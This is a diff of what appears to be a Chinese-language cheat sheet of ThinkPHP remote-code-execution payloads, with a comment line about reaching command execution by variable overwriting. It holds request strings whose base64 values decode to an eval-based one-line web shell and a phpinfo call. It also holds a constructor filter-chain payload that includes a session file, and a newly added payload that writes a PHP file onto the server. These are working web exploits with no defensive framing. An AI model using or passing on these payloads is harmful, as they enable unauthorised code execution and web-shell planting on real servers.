@@ -153,7 +153,10 @@ post:未开强制路由，或利用变量覆盖达到命令执行
 
 /?s=captcha&r=ZXZhbCgkX1BPU1RbJ2NtZCddKTs=   ->一句话cmd
 /?s=captcha&r=cGhwaW5mbygpOw==               ->phpinfo
-  _method=__construct&filter[]=base64_decode&filter[]=think\__include_file&method=get&server[]=1&get[]=cGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZGVjb2RlL3Jlc291cmNlPS90bXAvc2Vzc19oYWhhaGF0ZXN0
+    _method=__construct&filter[]=base64_decode&filter[]=think\__include_file&method=get&server[]=1&get[]=cGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZGVjb2RlL3Jlc291cmNlPS90bXAvc2Vzc19oYWhhaGF0ZXN0
+    
+/?s=captcha&g=implode
+path=PD9waHAgZmlsZV9wdXRfY29udGVudHMoJzEyMy5waHAnLCc8P3BocCBwaHBpbmZvKCk7Pz4nKTsgPz4=&_method=__construct&filter[]=set_error_handler&filter[]=self::path&filter[]=base64_decode&filter[]=\think\view\driver\Php::Display&method=GET
 ```
 
 
